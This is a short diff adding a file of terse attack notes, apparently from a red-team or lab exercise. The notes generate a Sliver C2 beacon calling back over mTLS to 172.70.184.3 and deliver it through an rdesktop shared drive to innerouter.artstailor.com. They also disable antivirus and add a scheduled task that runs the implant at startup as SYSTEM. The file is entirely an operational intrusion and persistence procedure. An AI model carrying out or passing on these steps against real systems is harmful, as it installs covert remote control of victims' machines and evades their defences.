@@ -1,0 +1,10 @@
+sliver
+generate beacon --mtls 172.70.184.3 --save ~/Sliver.exe
+mktemp -d
+cp Sliver.exe /tmp/<tmp>
+rdesktop innerouter.artstailor.com -r disk:win32=/tmp/<tmp>
+turn off virus
+net use z: \\tsclient\win32
+move to c:\users\pr0b3
+schtasks /create /tn "Sliver" /tr "C:\users\pr0b3\sliver.exe" /sc ONSTART /ru "system"
+schtasks /Run /TN Sliver
